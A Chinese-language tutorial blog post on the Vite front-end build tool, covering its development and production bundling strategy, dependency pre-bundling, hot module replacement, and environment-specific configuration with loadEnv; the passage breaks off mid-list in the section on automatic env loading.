table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">浅析Vite前端构建工具</h2>
<p>本篇文章意在帮助初学者了解Vite的工作流程以及学习常见配置</p>
<h3 data-id="heading-1">Vite简介</h3>
<blockquote>
<p><strong>Vite</strong>（法语意为快速）是vue官方发布的新型前端构建工具，用于快速构建前端项目，显著提升开发体验，其特点就是快！</p>
</blockquote>
<p><code>！！！注意：</code><strong>Vite</strong>是构建工具，虽然具有打包功能，但其打包能力来自其他打包工具，如在开发环境下使用<code>esbuild</code>进行打包，而在生产环境下则使用<code>rollup</code>进行打包，<strong>vite</strong>更注重的是前端的自动化流程。开发好的代码，通过自动化流程转换成生产环境代码。</p>
<h4 data-id="heading-2">为什么选择Vite</h4>
<blockquote>
<p>随着前端的发展，我们开始需要构建越来越大型的应用，需要处理的JavaScript代码呈指数级增长。</p>
<p>而传统的打包工具在构建这种大型项目时就会遇到性能问题，如项目启动速度缓慢，热更新（HMR）迟钝，这极大的影响了开发者的开发体验。</p>
<p>以下是常见的打包构建工具：</p>
<ul>
<li>Webpack</li>
<li>rollup</li>
<li>parcel</li>
<li>gulp</li>
</ul>
<p>这些工具在大型项目中都存在缓慢的服务启动和缓慢的热更新问题，而<strong>Vite</strong>恰好对这两个问题提出了解决方案，所以<strong>Vite</strong>在启动项目时的速度相当之快</p>
<p>所以<strong>Vite</strong>的优势就是：</p>
<ul>
<li>开发启动速度快</li>
<li>热更新（HMR）响应迅速</li>
<li>构建性能高效</li>
<li>配置简单且扩展性强</li>
</ul>
</blockquote>
<hr/>
<h3 data-id="heading-3">Vite的打包构建策略</h3>
<blockquote>
<p>这里我们将简单梳理Vite的在开发阶段、热更新阶段，以及在生产阶段时的构建思路。</p>
</blockquote>
<p>先来看vite官方文档中的两张图</p>
<p>前一张图是传统构建工具的打包构建流程图，它们在启动项目时采用的策略是对项目代码和其依赖进行全量打包后再启动服务。</p>
<p>后一张图是<strong>Vite</strong>的打包构建流程，<strong>Vite</strong>采用的策略是先启动服务，之后按需加载所需要的代码文件。</p>
<ul>
<li>图一</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dab2bfe05cec43eb90f789e2be4681f5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=vD35bqxy%2FDa2nla6q8aaD9ivUNE%3D" alt="" loading="lazy"/></p>
<ul>
<li>图二</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/67faac25d708467a944329581bd3279c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=kmqo696WcFNxjtj9n1hM6n1Wupo%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-4">传统打包构建工具的问题</h4>
<p>从不同的打包策略中我们可以分析出，造成传统打包工具服务启动缓慢，热更新响应速度慢的原因：</p>
<blockquote>
<ul>
<li>必须打包后才能启动服务。当项目越大，代码文件越多时，打包需要处理的模块数量就越多，启动等待时间就会成先行指数级增长，大型项目启动耗时几分钟很常见。</li>
<li>依赖处理无缓存。一些第三方依赖（如Vue、React、Axios、Lodash）通常体积大且变动少，每次启动/修改都会重复处理，就会造成资源浪费，进一步延长了启动时间。</li>
<li>模块依赖链重新构建。当某个文件被修改时，工具不仅要重新编译这个文件，还要重新处理所有依赖它的上游模块，导致热更新速度慢。</li>
</ul>
</blockquote>
<h4 data-id="heading-5">开发环境打包</h4>
<p>一开始<strong>Vite</strong>将应用中的模块区分为了两类，<strong>依赖</strong>和<strong>源码</strong>。</p>
<blockquote>
<ul>
<li>
<p>依赖：大多是在开发时不会变动的第三方库（如loadash、elementPlus等）。</p>
</li>
<li>
<p>源码：通常是开发者编写的代码，时常会被编辑，需要转换的文件（如Vue、CSS、JSX等）</p>
</li>
</ul>
</blockquote>
<p>开发环境下，<strong>Vite</strong>会使用<strong>esbuild</strong>对依赖进行打包（即<strong>依赖预构建</strong>）。</p>
<p>对于源码<strong>Vite</strong>通常将其打包工作交给了浏览器而不是打包，只在浏览器请求源码时进行转换并按需提供源码。</p>
<p><strong>esbuild</strong>是go语言编写的打包工具，比使用JavaScript编写的打包工具速度快10-100倍。</p>
<h4 data-id="heading-6">热更新（HMR）</h4>
<blockquote>
<p>前面我们知道了，如果仅仅修改一个文件就要重新构建整个模块是及其低效的，而且体积越大时，更新的速度也会越慢。</p>
</blockquote>
<p>所以<strong>Vite</strong>热更新的策略是<strong>精准、高效地更新变化的模块，避免全量页面刷新</strong>，同时尽可能保留应用状态。</p>
<p>整个热更新阶段，<strong>vite</strong>经历了以下几个步骤</p>
<ol>
<li>首先开发服务器会实时监控文件修改。</li>
<li>监测到文件修改时，会通过模块依赖图，找到受变更影响的模块链。</li>
<li>针对变化模块（如 JS、CSS、Vue 等）快速生成更新代码。</li>
<li>然后通过 WebSocket 将更新指令发送给客户端。</li>
<li>客户端在接收指令后，动态替换旧模块、执行新代码，仅更新受影响部分，保留应用状态，避免全量刷新。</li>
</ol>
<h4 data-id="heading-7">生产环境打包</h4>
<p>Vite 在生产环境的打包构建思路与开发环境截然不同，核心目标是<strong>生成优化后的、可直接部署的静态资源</strong>，兼顾性能（加载速度、运行效率）和浏览器兼容性。</p>
<ol>
<li><strong>基于 Rollup 进行打包构建</strong></li>
</ol>
<p>首先<strong>VIte</strong>使用功能更成熟的Rollup 作为底层打包工具（开发阶段用的是esbuild，因为它对代码压缩、Tree-shaking 等优化更高效）。</p>
<ol start="2">
<li><strong>配置Vite后可以进行的优化（生产环境下）</strong>
<ul>
<li>自动将代码拆分为多个 chunk：
<ul>
<li>入口 chunk：应用的主入口代码。</li>
<li>公共 chunk：提取多个模块共享的代码（如工具函数、重复依赖），避免重复加载。</li>
<li>异步 chunk：对 <code>import()</code> 动态导入的模块单独打包，实现 “按需加载”（如路由懒加载），减少初始加载体积。</li>
</ul>
</li>
<li>Tree-Shaking 消除冗余代码:
<ul>
<li>利用 Rollup 的 Tree-Shaking 能力，删除未被引用的代码（如未使用的函数、变量），减小最终 bundle 体积。</li>
<li>对第三方库，优先使用其 ESM 版本（通过 <code>package.json</code> 的 <code>module</code> 或 <code>exports</code> 字段），确保 Tree-Shaking 有效。</li>
</ul>
</li>
<li>对 JS、CSS 代码进行压缩：
<ul>
<li>JS：使用 <code>terser</code> 压缩（默认开启），移除空格、缩短变量名、合并语句等。</li>
<li>CSS：使用 <code>cssnano</code> 压缩，移除冗余样式、合并规则等。</li>
</ul>
</li>
<li>支持通过配置来开启代码混淆，提高逆向工程难度。</li>
<li>优化图片、字体等静态资源体积：
<ul>
<li>小资源（如小于 4KB 的图片）自动转为 base64 编码嵌入代码，减少网络请求</li>
<li>大资源生成带哈希值的文件名（如 <code>logo.8f3b7a.png</code>），配合长期缓存策略（<code>Cache-Control</code>），提升二次加载速度。</li>
</ul>
</li>
<li>兼容性处理:
<ul>
<li>通过 <code>@vitejs/plugin-legacy</code> 插件：生成兼容 ES5 的代码（使用 <code>babel</code> 转换语法），并且自动注入 polyfill（如 <code>core-js</code>），处理新 API 兼容问题。</li>
<li>通过 <code>postcss</code> + <code>autoprefixer</code>自动添加CSS前缀，从而适配不同浏览器内核。</li>
</ul>
</li>
</ul>
</li>
<li><strong>构建流程</strong>
<ul>
<li><strong>解析配置</strong>：读取 <code>vite.config.js</code> 中的生产环境配置（如 <code>build</code> 选项）。</li>
<li><strong>依赖预构建复用</strong>：复用开发环境预构建的第三方依赖（或重新构建，确保一致性），避免重复处理。</li>
<li><strong>模块打包</strong>：通过 Rollup 递归解析项目依赖，应用代码分割、Tree-Shaking 等优化，生成多个 chunk。</li>
<li><strong>资源处理</strong>：处理静态资源、压缩代码、生成哈希文件名。</li>
<li><strong>生成产物</strong>：输出最终文件到 <code>dist</code> 目录，包含 HTML、JS、CSS、静态资源等，并自动处理资源间的引用路径（如 HTML 中引入带哈希的 JS/CSS）。</li>
</ul>
</li>
</ol>
<hr/>
<h3 data-id="heading-8">依赖预构建</h3>
<p>这里我们将了解在生产阶段时，<strong>Vite</strong>如何对依赖进行预构建，以及做了哪些优化。</p>
<p><strong>目的</strong>：</p>
<blockquote>
<ul>
<li>更好的兼容性</li>
<li>更好的性能</li>
</ul>
</blockquote>
<p>这里我们先简单创建一个Vite项目，方便后续讲解。</p>
<p><strong>创建一个示例项目</strong>：</p>
<p>首先,打开或者新建一个空的项目文件夹，在其根目录下打开控制台并执行以下命令初始化<code>package.json</code>文件。</p>
<pre><code class="hljs language-csharp" lang="csharp">npm <span class="hljs-keyword">init</span> -y <span class="hljs-comment">// -y:自动在package.json中填入默认配置，无需手动配置</span>
或
pnpm <span class="hljs-keyword">init</span> <span class="hljs-comment">// pnpm无需 -y,默认进行配置</span>
</code></pre>
<p>然后安装Vite</p>
<pre><code class="hljs language-csharp" lang="csharp">npm i vite -D <span class="hljs-comment">// -D, --save-dev的缩写，作用是将依赖包安装为 “开发环境依赖”</span>
或
pnpm <span class="hljs-keyword">add</span> vite -D
</code></pre>
<p>然后初始化项目结构：</p>
<pre><code class="hljs language-go" lang="go">video-test
├─ node_modules
├─ main.js
├─ index.html  <span class="hljs-comment">// 项目打包入口文件</span>
├─ <span class="hljs-keyword">package</span>-lock.json <span class="hljs-comment">// 使用pnpm命令时是pnpm-lock.yaml</span>
├─ <span class="hljs-keyword">package</span>.json
</code></pre>
<p>在index.html中引入main.js</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- index.html --&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- type="moudle"作用是告诉浏览器按照 ESM 规则解析和执行代码 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"moudle"</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"./main.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>    
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<h4 data-id="heading-9"><strong>依赖打包</strong></h4>
<p><strong>Vite</strong>在启动开发服务器时，会对依赖进行预构建：<strong>Vite</strong>会使用<strong>esbuild</strong>对第三方依赖对其进行打包。打包的过程中就会执行<strong>兼容性处理</strong>和<strong>路径解析</strong>、<strong>文件缓存优化</strong>、<strong>浏览器缓存优化</strong>，然后对<strong>源码</strong>进行一系列处理后交给浏览器打包。</p>
<h4 data-id="heading-10"><strong>兼容性处理</strong></h4>
<p>在开发时，很多第三方库或项目代码可能使用 CommonJS（CJS）、UMD 等非 ESM 模块化语法，而浏览器原生 ESM 只能识别 <code>import</code>/<code>export</code> 语法，无法直接运行 CJS 模块（如 <code>require</code>、<code>module.exports</code>）。</p>
<p>例如<code>lodash</code>库，执行以下命令引入<code>lodash</code>库:</p>
<pre><code class="hljs language-csharp" lang="csharp">npm i lodash 
或
pnpm <span class="hljs-keyword">add</span> lodash
</code></pre>
<p>打开<code>node_modules\lodash\_apply.js</code>，我们可以看到<code>lodash</code>使用了非<strong>ESM</strong>标准的导入导出方式</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/15e10212d8e5459b92f22ced0d6cc2bf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=f1LyFfis4M9hjg2L47BBxq7xGCc%3D" loading="lazy"/>
<p><strong>Vite</strong>的开发服务器将所有代码视为原生 ES 模块，所以必须要处理兼容性问题。<strong>Vite</strong>采用策略是当浏览器对某个模块发送请求时使用<strong>esbuild</strong>对其进行转换操作，不仅解决了兼容性问题，还避免了全量打包带来的性能消耗。</p>
<h4 data-id="heading-11">路径解析</h4>
<p><strong>1.无法识别的路径</strong></p>
<p>浏览器并不知道要到<code>node_modules</code>目录下去找对应依赖，即对于非相对路径和绝对路径的导入是无法识别的。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> axios <span class="hljs-keyword">from</span> <span class="hljs-string">'axios'</span> <span class="hljs-comment">// 没有使用绝对路径和相对路径，浏览器不知道怎么获取</span>
</code></pre>
<p>为了处理无法识别例如<code>'axios'</code>这种裸模块名，<strong>Vite</strong>会在依赖构建阶段对其进行路径映射为具体的文件路径：</p>
<blockquote>
<ul>
<li>分析依赖的入口文件（通过 <code>package.json</code> 的 <code>main</code> 或 <code>module</code> 字段），确定该模块名实际对应的文件（如 <code>node_modules/axios/dist/axios.esm.js</code>）。</li>
<li>预构建后的依赖会放到<code>.node_modules/.vite/.deps</code>目录下，并生成一个映射表（<code>deps_map</code>），记录裸模块名与实际路径的对应关系。</li>
</ul>
</blockquote>
<p>然后在浏览器解析到<code>import axios from 'axios'</code>而对<strong>Vite开发服务器</strong>发送请求时，<strong>Vite</strong>在拦截到该请求后，根据依赖构建阶段时创建的映射表将其<strong>路径重写</strong> 为具体的预构建文件路径（如 <code>/node_modules/.vite/deps/axios.js</code>），并返回给浏览器，使得浏览器能正确加载模块。</p>
<p>2.<strong>相对路径和别名路径的处理</strong></p>
<p>对于项目内的相对路径（如 <code>import './utils'</code>），Vite 会自动补全文件后缀（<code>.js</code>、<code>.ts</code> 等）和目录索引文件（<code>index.js</code>），避免浏览器因路径不全导致的 404 错误。同时支持通过 <code>vite.config.js</code> 配置 <code>resolve.alias</code> 自定义路径别名（如 <code>@/utils</code>），进一步简化路径编写。</p>
<h4 data-id="heading-12"><strong>文件缓存</strong></h4>
<p>打包后的代码会放到<code>node_modules/.vite</code>文件下面进行<strong>文件缓存</strong>（同时转换为<strong>ESM</strong>标准），并且将嵌套引用的依赖打包为一个文件，以减少浏览器的http请求（例如<code>lodash库作为第三方依赖会被打包成一个js文件</code>），并在之后的开发服务启动时使用这个缓存直到第三方依赖发生修改才重新进行依赖预构建，减少了依赖打包构建次数。</p>
<ul>
<li><code>node_modules/.vite</code> 目录下的缓存文件会包含<strong>版本哈希标识</strong>（如 <code>react.js?v=123abc</code>），哈希值由依赖内容、版本号及 Vite 配置共同生成，确保依赖或配置变更时，缓存会自动失效并触发重新构建。</li>
<li>缓存目录中还会生成 <code>_metadata.json</code> 文件，记录依赖的构建信息（如入口、依赖链），用于 Vite 启动时快速校验缓存是否有效，减少重复扫描开销。</li>
</ul>
<h4 data-id="heading-13"><strong>浏览器缓存</strong></h4>
<p>同时对于已预构建的依赖请求使用 HTTP 头 <code>max-age=31536000, immutable</code> 进行强缓存，以提高开发期间页面重新加载的性能。同样如果依赖源没有发生改变，这些请求将永远不会再次访问开发服务器，而是直接从级存中读取。而对于源码。</p>
<h4 data-id="heading-14"><strong>源码交给浏览器打包</strong></h4>
<ul>
<li>源码（如业务 JS、TS、Vue 组件等）会被 Vite 实时转换为 ESM 格式（例如将 TS 转 JS、处理 CSS 模块），但<strong>不进行合并打包</strong>，而是保留模块间的引用关系（如 <code>import './component'</code>）。</li>
<li>浏览器加载这些 ESM 模块时，会根据 <code>import</code> 语句主动发起子请求，由 Vite 服务器实时返回对应模块的转换结果，本质是<strong>将 “打包合并” 的工作分散到浏览器的原生模块加载过程中</strong>，减少开发服务器的计算压力，实现 “按需编译”。</li>
</ul>
<h3 data-id="heading-15">配置智能提示</h3>
<p>在添加配置项的时候会给出配置项联想，如图所示在配置对象中敲<code>ser</code>就会出现提示框</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e1c724494319492c98dd4bbd77682439~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=ws6HkkSThoXFKMA%2FkUoNgcUoOzA%3D" loading="lazy"/>
<p>官方给了三种智能提示的配置方法，推荐使用下面这种方式</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
	<span class="hljs-comment">//...</span>
})
</code></pre>
<h3 data-id="heading-16">准备配置文件</h3>
<p>准备好以下几个文件</p>
<p><code>vite.prod.config.js</code></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>
<span class="hljs-comment">// 生产环境配置</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({  
  <span class="hljs-attr">build</span>: {
      
  }
})
</code></pre>
<p><code>vite.dev.config.js</code></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>
<span class="hljs-comment">//开发环境配置</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({ 
  <span class="hljs-attr">server</span>: { 
  
  }
})
</code></pre>
<p><code>vite.base.config.js</code></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>
<span class="hljs-comment">// 公共配置</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({                        
})
</code></pre>
<p>将上诉的配置文件汇总，采用策略模式，在不同环境下引入不同的配置</p>
<p><code>vite.config.js</code></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">"vite"</span>
<span class="hljs-keyword">import</span> viteBaseConfig <span class="hljs-keyword">from</span> <span class="hljs-string">'./vite.base.config.js'</span> <span class="hljs-comment">//基础配置</span>
<span class="hljs-keyword">import</span> viteDevConfig <span class="hljs-keyword">from</span> <span class="hljs-string">'./vite.dev.config.js'</span> <span class="hljs-comment">// 开发环境配置</span>
<span class="hljs-keyword">import</span> viteProdConfig <span class="hljs-keyword">from</span> <span class="hljs-string">'./vite.prod.config.js'</span> <span class="hljs-comment">// 生产环境配置</span>

<span class="hljs-comment">// 策略模式</span>
<span class="hljs-keyword">const</span> envResolver = {
  <span class="hljs-comment">// 这里的展开运算符和Object.assign()都是浅拷贝的方法</span>
  <span class="hljs-string">"build"</span>: <span class="hljs-function">() =&gt;</span> ({...viteBaseConfig, ...viteProdConfig}),
  <span class="hljs-string">"serve"</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>({},viteBaseConfig, viteDevConfig)
}
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>( <span class="hljs-function">(<span class="hljs-params">{command}</span>) =&gt;</span> {
  <span class="hljs-comment">// command: 根据命令(pnpm dev | pnpm serve) 返回 ("build" | "serve")</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"command:"</span>, command);

  <span class="hljs-keyword">return</span> envResolver[command]()
})
</code></pre>
<h3 data-id="heading-17"><strong>环境变量（env）</strong></h3>
<p><strong>环境变量</strong>：是在操作系统或应用程序运行时存在的一组动态键值对（key-value），用于存储影响程序行为的配置信息。它们独立于程序代码本身，通过外部传递给程序，使程序能在不同环境（如开发、测试、生产）中灵活调整行为，而无需修改代码。</p>
<h4 data-id="heading-18">loadEnv</h4>
<p>是Vite的一个专门加载和处理环境变量的API，类似于dotenv库
dotenv 是一个非常实用的第三方库，主要用于从 .env 文件中加载环境变量到 process.env</p>
<p><strong>loadEnv的三个参数</strong></p>
<ul>
<li>mode: 当前运行模式（如 development、production、test，注意拼写）</li>
<li>envDir: .env 相关文件所在目录（默认项目根目录）</li>
<li>prefix: 环境变量的过滤前缀（用于后续注入import.meta.env，默认VITE_）</li>
</ul>
<p><strong>loadEnv执行过程</strong></p>
<ol>
<li>
<p>根据mode加载指定目录下的环境文件，加载顺序（优先级从低到高）：</p>
<ul>
<li>.env                （所有环境共享的基础配置）</li>
<li>.env.local       （本地私有基础配置，覆盖.env，通常不上传仓库）</li>
<li>.env.${mode}  （当前模式的专属配置，如.env.development）</li>
<li>.env.${mode}.local  （当前模式的本地私有配置，覆盖.env.${mode}，不上传仓库）
同时，系统环境变量的优先级最高，会覆盖所有文件中的同名变量</li>
</ul>
</li>
<li>
<p>变量合并规则：后加载的配置会覆盖前序配置中的同名变量
例如mode="development"时，最终合并结果为：</p>
<blockquote>
<p>{
...基础.env,
...本地.env.local,
...开发环境.env.development,
...开发本地.env.development.local,
...系统环境变量
} // 展开运算符</p>
</blockquote>
</li>
<li>
<p>函数返回值为合并后的所有环境变量（包含所有前缀/非前缀变量）</p>
</li>
<li>
<p><strong>loadEnv</strong>的返回值包含所有符合其自身<code>prefix</code>参数的环境变量（Node环境可见，用于配置逻辑）
但最终注入到<code>import.meta.env</code>的变量，由<strong>Vite</strong>的全局配置<code>envPrefix</code>（默认VITE_）决定：</p>
<ul>
<li>只有符合<code>envPrefix</code>前缀的变量，才会被注入到前端代码的import.meta.env中（浏览器环境可见）；</li>
<li>非<code>envPrefix</code>前缀的变量（即使被loadEnv返回），也不会暴露到前端，仅在Node环境的配置中可用（如后端密钥等敏感信息）。</li>
</ul>
</li>
</ol>
<h4 data-id="heading-19">手动加载机制</h4>
<p>在配置 Vite 本身时（如自定义开发服务器端口、生产环境打包路径等），需要依赖环境变量动态调整配置。此时通过 <code>loadEnv</code> 手动加载 <code>.env*</code> 文件中的变量，可在配置逻辑中直接使用。</p>
<p>通常为了在大型项目中提高项目的可维护性，我们可以在不同环境下都维护一个环境变量文件，即创建以下三个文件：</p>
<ul>
<li><code>.env</code>:公共的环境变量文件</li>
<li><code>.env.development</code>:开发环境下的环境变量文件</li>
<li><code>.env.production</code>:生产环境下的环境变量文件</li>
</ul>
<p>将这些配置文件放到<code>项目根目录\config\env\</code></p>
<p>然后可以在vite.config.js中使用loadEnv方法统一获取，传递给不同环境下的配置文件</p>
<p>在<code>vite.config.js</code>中修改:</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { defineConfig, loadEnv } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>
<span class="hljs-keyword">import</span> viteDevConfig <span class="hljs-keyword">from</span> <span class="hljs-string">'./vite.dev.config.js'</span>
<span class="hljs-keyword">import</span> viteProdConfig <span class="hljs-keyword">from</span> <span class="hljs-string">'./vite.prod.config.js'</span>
<span class="hljs-keyword">import</span> viteBaseConfig <span class="hljs-keyword">from</span> <span class="hljs-string">'./vite.base.config.js'</span>

<span class="hljs-comment">// 策略模式</span>
<span class="hljs-keyword">const</span> endResolver = {
  <span class="hljs-comment">// 添加一个参数</span>
  <span class="hljs-string">"build"</span>: <span class="hljs-function">(<span class="hljs-params">env</span>) =&gt;</span> {
     <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"生产环境"</span>);
     <span class="hljs-keyword">return</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>({}, viteBaseConfig, <span class="hljs-title function_">viteProdConfig</span>(env))
  },
  <span class="hljs-comment">// 添加一个参数</span>
  <span class="hljs-string">"serve"</span>: <span class="hljs-function">(<span class="hljs-params">env</span>) =&gt;</span> {
     <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"开发环境"</span>);
     <span class="hljs-keyword">return</span> ({ ...viteBaseConfig, ...<span class="hljs-title function_">viteDevConfig</span>(env)})
  } 
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>(<span class="hljs-function">(<span class="hljs-params">{command, mode}</span>) =&gt;</span> {
  <span class="hljs-comment">// command: 根据命令(pnpm dev | pnpm serve) 返回 ("build" | "serve")</span>
  <span class="hljs-comment">// mode: vite会将命令(pnpm dev --mode delvelopment)中--mode后面的值development赋值给mode</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"command:"</span>, command);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"mode:"</span>, mode);
  
  <span class="hljs-comment">// 获取到对应环境下的环境变量，loadEnv的合并规则请查看执行过程中的描述</span>
  <span class="hljs-keyword">const</span> env = <span class="hljs-title function_">loadEnv</span>(mode, <span class="hljs-string">'./config/env'</span>, <span class="hljs-string">""</span>)
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">".env:"</span>, env);
  
  <span class="hljs-keyword">return</span>  endResolver[command](env) <span class="hljs-comment">// 将其作为参数传给对应的配置文件 </span>
})
</code></pre>
<p><code>vite.prod.config.js</code>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> (env) =&gt; <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">server</span>: {
    
  }
})
</code></pre>
<p><code>vite.dev.config.js</code></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> (env) =&gt; <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">build</span>: {
    
  }
})
</code></pre>
<h4 data-id="heading-20">自动加载机制</h4>
<p>Vite 会在项目构建或开发过程中，<strong>自动从指定目录加载环境变量文件，并将符合规则的变量注入到客户端代码的 <code>import.meta.env</code> 中</strong>。这一过程由 Vite 内部机制完成，无需开发者手动调用函数，核心依赖以下配置：</p>
<ul>
<li><strong><code>envDir</code> 配置项</strong>：指定环境变量文件（如 <code>.env</code>、<code>.env.[mode]</code>）的存放目录（默认为项目根目录）。Vite 会根据当前运行模式（<code>mode</code>）自动从该目录加载对应的文件（如开发模式加载 <code>.env.development</code>）。</li>
